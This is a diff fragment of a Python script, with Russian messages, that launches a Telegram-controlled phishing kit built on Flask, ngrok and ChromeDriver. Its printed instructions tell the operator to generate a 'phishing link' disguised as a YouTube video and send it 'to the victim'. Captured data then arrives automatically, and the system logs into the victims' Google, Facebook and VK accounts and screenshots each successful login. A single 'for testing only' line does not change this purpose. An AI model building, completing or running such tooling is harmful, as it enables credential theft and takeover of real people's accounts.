+        print("❌ ОШИБКА: Не установлен BOT_TOKEN!")
+        print("Получите у @BotFather и вставьте в код")
+        sys.exit(1)
+    
+    if NGROK_AUTH_TOKEN == "ВАШ_ТОКЕН_NGROK":
+        print("❌ ОШИБКА: Не установлен NGROK_AUTH_TOKEN!")
+        print("Получите на ngrok.com и вставьте в код")
+        sys.exit(1)
+    
+    print("✅ Токены проверены")
+    print(f"👑 Администратор: {ADMIN_ID}")
+    print(f"🌐 Порт Flask: {FLASK_PORT}")
+    print(f"🚀 Автовход: Настроен на {AUTO_LOGIN_CONFIG['device_name']}")
+    print()
+    
+    # Создаем папку для скриншотов
+    os.makedirs("screenshots", exist_ok=True)
+    
+    # Запускаем Flask
+    flask_thread = threading.Thread(target=run_flask, daemon=True)
+    flask_thread.start()
+    
+    time.sleep(2)  # Даем Flask время на запуск
+    
+    # Запускаем ChromeDriver для автовхода
+    print("🚀 Запуск ChromeDriver для автоматического входа...")
+    if auto_login_manager.setup_driver():
+        print("✅ ChromeDriver запущен и готов к автоматическому входу")
+    else:
+        print("⚠️ ChromeDriver не запущен, автовход недоступен")
+        print("Установите Chrome и ChromeDriver для работы автовхода")
+    
+    # Создаем Telegram бота
+    try:
+        telegram_app = Application.builder().token(BOT_TOKEN).build()
+        
+        # Регистрируем обработчики
+        telegram_app.add_handler(CommandHandler("start", start_command))
+        telegram_app.add_handler(CommandHandler("start_ngrok", start_ngrok_command))
+        telegram_app.add_handler(CommandHandler("stop_ngrok", stop_ngrok_command))
+        telegram_app.add_handler(CommandHandler("get_url", get_url_command))
+        telegram_app.add_handler(CommandHandler("stats", stats_command))
+        telegram_app.add_handler(CommandHandler("my_links", my_links_command))
+        telegram_app.add_handler(CommandHandler("auto_login", auto_login_command))
+        telegram_app.add_handler(CommandHandler("data", data_command))
+        telegram_app.add_handler(CommandHandler("help", button_handler))
+        
+        # Inline кнопки
+        telegram_app.add_handler(CallbackQueryHandler(button_handler))
+        
+        # Обработчик ошибок
+        telegram_app.add_error_handler(error_handler)
+        
+        print("✅ Flask сервер запущен")
+        print("✅ Telegram бот инициализирован")
+        print()
+        print("=" * 70)
+        print("🚀 СИСТЕМА ГОТОВА К РАБОТЕ!")
+        print("=" * 70)
+        print()
+        print("💡 ИНСТРУКЦИЯ ПО ИСПОЛЬЗОВАНИЮ:")
+        print("1. Напишите боту /start")
+        print("2. Нажмите 'Запустить ngrok' или используйте /start_ngrok")
+        print("3. Получите URL через /get_url")
+        print("4. Откройте URL в браузере")
+        print("5. Вставьте ссылку на YouTube видео")
+        print("6. Получите фишинг ссылку")
+        print("7. Отправьте ссылку жертве")
+        print("8. Данные будут приходить автоматически")
+        print("9. Система сама войдет в аккаунты на вашем устройстве")
+        print()
+        print("⚡ ОСОБЕННОСТИ СИСТЕМЫ:")
+        print("• YouTube видео работает как настоящее")
+        print("• Сбор данных в фоновом режиме")
+        print("• Автоматический вход в Google, Facebook, VK и др.")
+        print("• Скриншоты успешных входов")
+        print("• Все данные сохраняются в базу")
+        print()
+        print("⚠️  ВНИМАНИЕ: Используйте только для тестирования!")
+        print("    Все действия логируются и отслеживаются.")
+        print("=" * 70)
+        
+        # Запускаем бота
+        telegram_app.run_polling(allowed_updates=Update.ALL_UPDATES)
+        
+    except Exception as e:
+        logger.error(f"Failed to start bot: {e}")
+        print(f"❌ Ошибка запуска бота: {e}")
+        sys.exit(1)
 
 if __name__ == '__main__':
     main()
